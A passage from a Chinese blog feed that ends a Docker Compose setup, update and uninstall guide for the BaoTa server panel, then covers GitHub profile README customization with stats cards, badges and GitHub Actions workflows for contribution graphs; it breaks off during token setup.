<span class="string">&#x27;443:443&#x27;</span>  <span class="comment"># 保持默认即可，不建议修改左侧的443</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PUID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PGID=1000</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=bt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=bt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_USER=bt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_PASSWORD=bt</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">BTPANEL_KEY=your_key</span>  <span class="comment"># 替换为你的宝塔面板密钥。</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./database:/root/mysql/</span>  <span class="comment"># 冒号左边可以改路径，现在是表示把数据存放在在当前文件夹下的 database 文件夹中，以此类推</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./www:/www/wwwroot/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config:/www/server/panel/data/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./ssl:/www/server/panel/vhost/cert/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./logs:/www/server/panel/logs/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./backup:/www/backup/</span></span><br></pre></td></tr></table></figure><p>按一下 <code>esc</code>，然后 <code>:wq</code> 保存退出。</p></li><li><p>打开服务器防火墙并访问网页<strong>（非必需但很重要）</strong></p></li></ul><p><strong>确保自己使用的服务器已经将上面的yaml文件中的端口都开启了</strong>，否则后面网页会访问不了。</p><p>有的服务器厂商默认关闭不常用的端口，所以需要手动打开。阿里云服务器是在安全组中添加规则开放端口，可以参考<a href="https://developer.aliyun.com/article/1209367">这里</a>，最好是参考所使用服务商提供的官方文档。</p><h3 id="运行并访问宝塔面板"><a href="#运行并访问宝塔面板" class="headerlink" title="运行并访问宝塔面板"></a>运行并访问宝塔面板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/bt-data   <span class="comment"># 来到 dockercompose 文件所在的文件夹下</span></span><br><span class="line"></span><br><span class="line">docker-compose up -d </span><br></pre></td></tr></table></figure><p>开启成功以后，理论上就可以输入 <code>http:// + 服务器ip:8888</code> 访问了。</p><p>默认登陆名和密码：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: admin</span><br><span class="line">Password: bt.cn</span><br></pre></td></tr></table></figure><div class="note red anzhiyufont anshiyu-icon-dengpao simple"><ol><li>不知道服务器 IP，可以直接在命令行输入：curl ip.sb，会显示当前服务器的 IP。</li><li>遇到访问不了的情况，请再次检查在服务商的后台防火墙<strong>是否打开对应了端口</strong>。</li></ol></div><h2 id="今后更新宝塔面板"><a href="#今后更新宝塔面板" class="headerlink" title="今后更新宝塔面板"></a>今后更新宝塔面板</h2><p>Docker部署的应用更新都很方便</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/bt-data</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/bt-data /root/data/docker_data/bt.archive  <span class="comment"># 万事先备份，以防万一</span></span><br><span class="line"></span><br><span class="line">docker-compose pull</span><br><span class="line"></span><br><span class="line">docker-compose up -d    <span class="comment"># 请不要使用 docker-compose stop 来停止容器，因为这么做需要额外的时间等待容器停止；docker-compose up -d 直接升级容器时会自动停止并立刻重建新的容器，完全没有必要浪费那些时间。</span></span><br><span class="line"></span><br><span class="line">docker image prune  <span class="comment"># prune 命令用来删除不再使用的 docker 对象。删除所有未被 tag 标记和未被容器使用的镜像</span></span><br></pre></td></tr></table></figure><p>提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span>? [y/N] </span><br></pre></td></tr></table></figure><p>输入 <code>y</code></p><h2 id="卸载宝塔面板"><a href="#卸载宝塔面板" class="headerlink" title="卸载宝塔面板"></a>卸载宝塔面板</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/bt-data</span><br><span class="line"></span><br><span class="line">docker-compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/bt-data  <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure><p>可以卸载得很干净。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> ECS </tag>
            
            <tag> 自建应用项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub首页DIY：花里胡哨指数++</title>
      <link href="/posts/86bbdefa.html"/>
      <url>/posts/86bbdefa.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e860e39e61d.png</cover>
      <date>Sat Jan 20 2024 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<div class="note blue anzhiyufont anzhiyu-icon-fan simple"><p>终于算是把之前挖的坑填了，上学期只是把首页CV过来，有好些内容都不是自己的，而且也不是很熟悉，现在放假回家又可以好好折腾了😋。也算是花了一点时间，把GitHub首页搞好了，第一时间分享给大家，顺便做个记录。相信很多童靴也像我一样，在敲代码之余，都致力于美化自身所处的环境。比如对IDE的美化，对电脑壁纸的精挑细选等等。</p></div><p><strong>终于知道为什么网上关于GitHub Profile的详细教程那么少了，真的不好写。所以如果本篇文章对你有帮助，能在GitHub给个免费star吗？</strong></p><h2 id="话不多说，先上成果！"><a href="#话不多说，先上成果！" class="headerlink" title="话不多说，先上成果！"></a>话不多说，先上成果！</h2><p>奉上源库地址和截图：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://github.com/JJLibra">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/23/6586e75c86de7.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">GitHub Profile</div>            <div class="tag-link-sitename">xxfer</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><details class="folding-tag" yellow><summary> 完整截图（建议点击图片放大看） </summary>              <div class='content'>              <div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/18/65f83b98c6bcc.jpg"/></div></div>              </div>            </details><p>如果喜欢，欢迎 CV 昂哈哈哈，能给我一个star就更好了。其实我的主页搞得有点过于花哨了，没必要，大家各取所需即可。</p><h2 id="开始花里胡哨"><a href="#开始花里胡哨" class="headerlink" title="开始花里胡哨"></a>开始花里胡哨</h2><details class="folding-tag" yellow><summary> 准备工作 </summary>              <div class='content'>              <p>其实GitHub首页DIY也很简单</p><ul><li>只需要新建一个仓库名和自己 Github 用户名相同的仓库并且添加一个<code>README.md</code>自述文件即可<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/01/6592ad6165b65.png"/></div></div></li><li>GitHub默认为此文件添加了demo，我们编辑此文件，即可开启自己的DIY之路了！<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/01/6592ad5470a5d.png"/></div></div></li><li>添加以后<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/01/6592ad70d3030.png"/></div></div></li></ul><p><strong>所以说，GitHub的首页DIY实际上就是对<code>README.md</code>文件进行DIY</strong></p>              </div>            </details><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>Github提供了这样一个特殊的markdown文件以供我们DIY主页，扩展性很高，如果熟悉HTML，CSS以及MarkDown 语法的话。资源的调用与布局不一一解释，相信看本篇博客的同学已有HTML的基础。</p></div><details class="folding-tag" yellow><summary> 无需配置Token即可使用 </summary>              <div class='content'>              <div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>这一部分不使用GitHub Actions，也就不需要使用Token，复制链接调整参数即可使用。</p></div><p><strong>注意下面的例子使用的一般是我的username，大家更换成自己的即可</strong></p><h3 id="开头打字特效"><a href="#开头打字特效" class="headerlink" title="开头打字特效"></a>开头打字特效</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aaab2744ed0.png"/></div></div><p>emmmm…对，就是这样的循环打字特效，很炫酷 –&gt; <a href="https://github.com/DenverCoder1/readme-typing-svg">源码传送门</a><br>可以使用官方给的<a href="https://readme-typing-svg.demolab.com/demo/">Demo site</a>，预览效果，然后直接复制代码即可。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://blog.xxfer.cn/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://readme-typing-svg.demolab.com?font=Fira+Code&amp;pause=1000&amp;width=435&amp;lines=console.log(%22Hello%2C%20World%22);小李今天又在努力变强鸭~&amp;center=true&amp;size=27&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="GitHub-Stats-Card"><a href="#GitHub-Stats-Card" class="headerlink" title="GitHub Stats Card"></a>GitHub Stats Card</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aaab9ac49ae.png"/></div></div><p>在<code>README.md</code>文件中获取动态生成的 GitHub 统计信息 –&gt; <a href="https://github.com/anuraghazra/github-readme-stats">源码传送门</a><br>这里建议看官方的README介绍，并不难，觉得看英文累，用浏览器的翻译就行。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">&quot;190px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://github-readme-stats.vercel.app/api?username=JJLibra&amp;theme=radical&amp;show_icons=true&amp;count_private=true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Most-used-languages"><a href="#Most-used-languages" class="headerlink" title="Most used languages"></a>Most used languages</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aaae64f06cf.png"/></div></div><p>在<code>README.md</code>文件中添加使用编程语言对比统计图 –&gt; <a href="https://github.com/anuraghazra/github-readme-stats">源码传送门</a><br>和上面的是同一个网址，还是建议直接看官方文档。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">&quot;190px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://github-readme-stats-git-masterrstaa-rickstaa.vercel.app/api/top-langs/?username=JJLibra&amp;theme=radical&amp;show_icons=true&amp;count_private=true&amp;layout=compact&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="GitHub-streak"><a href="#GitHub-streak" class="headerlink" title="GitHub streak"></a>GitHub streak</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aab077e84f9.png"/></div></div><p>在<code>README.md</code>文件中展示连续提交代码的次数 –&gt; <a href="https://github.com/DenverCoder1/github-readme-streak-stats">源码传送门</a><br>可以使用官方给的<a href="https://streak-stats.demolab.com/">Demo site</a>，预览效果，复制代码即可。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://github-readme-streak-stats.herokuapp.com/?user=JJLibra&amp;theme=default&amp;hide_border=true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Github-Profile-Trophy"><a href="#Github-Profile-Trophy" class="headerlink" title="Github Profile Trophy"></a>Github Profile Trophy</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aaaf1e2d84c.png"/></div></div><p>添加奖杯信息 –&gt; <a href="https://github.com/ryo-ma/github-profile-trophy/">源码传送门</a><br>官方给出了很多主题配色，可以都试一下，喜欢哪一种就用哪一种。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">alig</span> <span class="attr">src</span>=<span class="string">&quot;https://github-profile-trophy.vercel.app/?username=JJLibra&amp;theme=juicyfresh&amp;column=9&amp;rank=-U&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h3 id="GitHub-Readme-Activity-Graph"><a href="#GitHub-Readme-Activity-Graph" class="headerlink" title="GitHub Readme Activity Graph"></a>GitHub Readme Activity Graph</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aab6397a3ff.png"/></div></div><p>动态生成的活动图，用于显示过去 31 天的 GitHub 活动 –&gt; <a href="https://github.com/Ashutosh00710/github-readme-activity-graph/">源码传送门</a></p><p>同样，可以选择主题配色和自定义元素颜色，详情参考官方文档。<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://github-readme-activity-graph.vercel.app/graph?username=JJLibra&amp;custom_title=Xxfer&#x27;s%20GitHub%20Activity%20Graph&amp;bg_color=141321&amp;color=A9FEF7&amp;line=626069&amp;point=F8D847&amp;area_color=FE428E&amp;title_color=FE428E&amp;area=true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Spotify"><a href="#Spotify" class="headerlink" title="Spotify"></a>Spotify</h3><p><strong>我没有使用，因为不常用spotify</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab6ae05b4ff.png"/></div></div><p>可以在 GitHub 首页中展示最近在 spotify 中听过的音乐 –&gt; <a href="https://github.com/kittinan/spotify-github-profile">源码传送门</a><br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://spotify-github-profile.vercel.app/api/view?uid=31k53kp6hgkbovg72427dya5av44&amp;cover_image=true&amp;theme=default&amp;show_offline=false&amp;background_color=121212&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Joke"><a href="#Joke" class="headerlink" title="Joke"></a>Joke</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab6cd12137e.png"/></div></div><p>可以在 GitHub 首页中展示一些关于 IT 行业的笑话 –&gt; <a href="https://github.com/ABSphreak/readme-jokes">源码传送门</a><br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://readme-jokes.vercel.app/api?hideBorder&amp;bgColor=%23121212&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Jokes Card&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Quotes"><a href="#Quotes" class="headerlink" title="Quotes"></a>Quotes</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab6cd127827.png"/></div></div><p>可以在 GitHub 首页中随机展示一段名人名言 –&gt; <a href="https://github.com/ABSphreak/readme-jokes">源码传送门</a><br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://quotes-github-readme.vercel.app/api?type=horizontal&amp;theme=dark&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Shields-徽章"><a href="#Shields-徽章" class="headerlink" title="Shields 徽章"></a>Shields 徽章</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aab76e4ce05.png"/></div></div><p>为开源项目生成高质量小徽章图标，直接复制链接使用 –&gt; <a href="https://shields.io/">传送门</a><br>例：<br>HTML5</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.shields.io/badge/-HTML5-E34F26?style=flat-square&amp;logo=html5&amp;logoColor=white&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>CSS3</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.shields.io/badge/-CSS3-1572B6?style=flat-square&amp;logo=css3&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>JS</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.shields.io/badge/-JavaScript-oringe?style=flat-square&amp;logo=javascript&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>相信聪明的同学对比一下就能领会使用方法，其实就是通过<strong>改变参数</strong>制作徽标。可以参考这篇<a href="https://sspai.com/post/59593">文章</a><br>其中，logo参数和颜色都可以在这个<a href="https://simpleicons.org/">网站</a>搜索到，还支持下载svg和pgf，一并安利给大家。建议把<code>style</code>设为<code>flat</code>。</p><p>另外，制作徽标的网站不止Shields，推荐以下几个比较好用的：</p><ul><li><a href="https://badgen.net/">Badgen</a></li><li><a href="https://forthebadge.com/">Forthebadge</a></li><li><a href="https://badge.fury.io/">Version Badge</a></li></ul><h3 id="Visitor-Badge"><a href="#Visitor-Badge" class="headerlink" title="Visitor Badge"></a>Visitor Badge</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aabcfa488e4.png"/></div></div><p>这个徽章会实时改变，记录此页面被访问的次数 –&gt; <a href="https://visitor-badge.glitch.me/">传送门</a><br>修改一下<code>username</code>就能使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://komarev.com/ghpvc/?username=JJLibra&amp;label=Views&amp;color=0e75b6&amp;style=flat&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;访问量统计&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="社交统计"><a href="#社交统计" class="headerlink" title="社交统计"></a>社交统计</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65aac0b5c9d39.png"/></div></div><p>在<code>README.md</code>文件中展示你在一些流行的网站的数据 –&gt; <a href="https://github.com/songquanpeng/stats-cards">传送门</a><br>目前API只支持一部分网站，不过可以把项目部署到自己的服务器，来监控自己服务器上部署的网站，具体参考官方文档。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://stats.justsong.cn/api/leetcode/?username=quanpeng&amp;theme=dark&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>              </div>            </details><details class="folding-tag" yellow><summary> 需要配置Token配合GitHub Actions才能使用 </summary>              <div class='content'>              <div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>这一部分需要用到GitHub Actions来更新动态数据，部分GitHub Actions需要配置Token。</p></div><h3 id="3D-Contribution"><a href="#3D-Contribution" class="headerlink" title="3D Contribution"></a>3D Contribution</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab72bf37cc4.png"/></div></div><p>在<code>README.md</code>文件中展示3D的贡献日历 –&gt; <a href="https://github.com/yoshi389111/github-profile-3d-contrib">源码传送门</a></p><p><strong>原理：利用GitHub Actions定时更新仓库中对应的svg，README文件中引用的svg也会跟着变化。</strong></p><ol><li>在项目根目录下创建<code>/.github/workflows/3D-contrib.yml</code>文件，将以下代码复制到该文件中：<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">3D</span> <span class="string">Contrib</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 21 * * *&quot;</span> <span class="comment">#更新时间</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">permissions:</span></span><br><span class="line">  <span class="attr">contents:</span> <span class="string">write</span></span><br><span class="line">  <span class="attr">pages:</span> <span class="string">write</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">generate-github-profile-3d-contrib</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">yoshi389111/github-profile-3d-contrib@0.7.0</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">USERNAME:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.repository_owner</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Commit</span> <span class="string">&amp;</span> <span class="string">Push</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          git config user.name github-actions</span></span><br><span class="line"><span class="string">          git config user.email github-actions@github.com</span></span><br><span class="line"><span class="string">          git add -A .</span></span><br><span class="line"><span class="string">          git commit -m &quot;generated&quot;</span></span><br><span class="line"><span class="string">          git push</span></span><br></pre></td></tr></table></figure></li><li>不需要额外的Token，文件中的<code>GITHUB_TOKEN</code>是工作流自动创建的令牌。</li><li>创建完提交代码到仓库，并尝试运行，看看是否配置成功</li></ol><ul><li>进入Setting旁边的<code>Action</code><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab88b30456b.png"/></div></div></li><li>选择<code>3D Contrib</code>，然后<code>Run workflow</code>。</li></ul><ol start="4"><li>在<code>README.md</code>文件中引用<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/JJLibra/JJLibra/profile-3d-contrib/profile-night-rainbow.svg&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="Snake-Contribution"><a href="#Snake-Contribution" class="headerlink" title="Snake Contribution"></a>Snake Contribution</h3><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/20/65ab7608f3fc9.png"/></div></div><p>在<code>README.md</code>文件中展示贪吃蛇贡献日历 –&gt; <a href="https://github.com/marketplace/actions/generate-snake-game-from-github-contribution-grid">源码传送门</a></p><p><strong>原理：利用GitHub Actions定时更新仓库中对应的svg，README文件中引用的svg也会跟着变化。</strong></p><ol><li>在项目根目录下创建<code>/.github/workflows/Snake-contrib.yml</code>文件，将以下代码复制到该文件中：<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Snake</span> <span class="string">Contrib</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">schedule:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span> <span class="string">&quot;0 20 * * *&quot;</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">generate:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">environment:</span> </span><br><span class="line">        <span class="attr">name:</span> <span class="string">GH_TOKEN</span></span><br><span class="line">    <span class="attr">timeout-minutes:</span> <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">generate</span> <span class="string">github-contribution-grid-snake.svg</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">aelassas/snk/svg-only@main</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">github_user_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.repository_owner</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">outputs:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            dist/profile-snake-contrib/github-contribution-grid-snake.svg</span></span><br><span class="line"><span class="string">            dist/profile-snake-contrib/github-contribution-grid-snake-dark.svg?palette=github-dark</span></span><br><span class="line"><span class="string"></span>            </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">push</span> <span class="string">github-contribution-grid-snake.svg</span> <span class="string">to</span> <span class="string">the</span> <span class="string">output</span> <span class="string">branch</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">crazy-max/ghaction-github-pages@v3.1.0</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">target_branch:</span> <span class="string">main</span></span><br><span class="line">          <span class="attr">build_dir:</span> <span class="string">dist</span></span><br><span class="line">          <span class="attr">keep_history:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure></li><li>我采用的是environment里的secret，可能和其他教程不太一样，不过是可行的</li></ol><details class="folding-tag" yellow><summary> 生成一个Token令牌 </summary>              <div class='content'>              <ul><li>右上角头像，进入setting<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240c1608.png" style="width:800px;"/></div></div></li><li>进入左侧栏底部的Deployer settings<div class="img-wrap"><div class="img-bg"><img class="img" 